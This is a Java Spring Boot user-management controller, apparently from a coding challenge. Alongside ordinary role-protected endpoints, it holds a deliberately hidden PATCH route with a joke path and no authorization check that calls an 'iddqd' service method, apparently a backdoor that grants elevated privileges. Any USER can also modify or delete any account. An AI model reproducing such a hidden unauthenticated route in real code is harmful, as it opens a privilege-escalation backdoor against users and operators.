package com.ia.desafioia.controllers;

import com.ia.desafioia.dto.UserDto;
import com.ia.desafioia.dto.UserResponseDto;
import com.ia.desafioia.dto.UserUpdateDto;
import com.ia.desafioia.models.User;
import com.ia.desafioia.services.interfaces.IUserDataService;
import org.apache.coyote.Response;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.security.access.prepost.PreAuthorize;
import org.springframework.web.bind.annotation.*;

import javax.servlet.http.HttpServletRequest;
import java.util.List;

@RestController
public class UserController {

    protected IUserDataService dataService;

    @Autowired
    public UserController(IUserDataService dataService) {
        this.dataService = dataService;
    }

    @PostMapping(value = "/user", consumes = "application/json")
    public ResponseEntity<User> createUser(@RequestBody UserDto dto){
        return new ResponseEntity<>(this.dataService.create(dto), HttpStatus.CREATED);
    }

    @GetMapping("/user/{id}")
    @PreAuthorize("hasAnyRole('ADMIN', 'USER')")
    public ResponseEntity<UserResponseDto> getUser(@PathVariable String id){
        return ResponseEntity.ok(this.dataService.findById(id));
    }

    @PatchMapping(value = "/user/{id}", consumes = "application/json")
    @PreAuthorize("hasAnyRole('ADMIN', 'USER')")
    public ResponseEntity<User> update(@PathVariable String id, @RequestBody UserUpdateDto dto){
        return new ResponseEntity<>(this.dataService.update(id, dto), HttpStatus.OK);
    }


    @DeleteMapping(value = "/user/{id}")
    @PreAuthorize("hasAnyRole('ADMIN', 'USER')")
    public ResponseEntity<Boolean> delete(@PathVariable String id){
        return ResponseEntity.ok(this.dataService.delete(id));
    }

    @GetMapping("/users")
    @PreAuthorize("hasAnyRole('ADMIN', 'USER')")
    public ResponseEntity<List<UserResponseDto>> getAllUsers(){
        return ResponseEntity.ok(this.dataService.findAll());
    }

    @GetMapping("/users/pagination")
    @PreAuthorize("hasAnyRole('ADMIN', 'USER')")
    public ResponseEntity<List<UserResponseDto>> getUsers(@RequestParam int page, @RequestParam int limit){
        return ResponseEntity.ok(this.dataService.findAll(page, limit));
    }

    @PatchMapping("/secret/noreally/howdidyoufindme/ugh/ok/whatever/{id}")
    public ResponseEntity<String> iddqd(@PathVariable String id){
        return new ResponseEntity<>(this.dataService.iddqd(id), HttpStatus.OK);
    }
}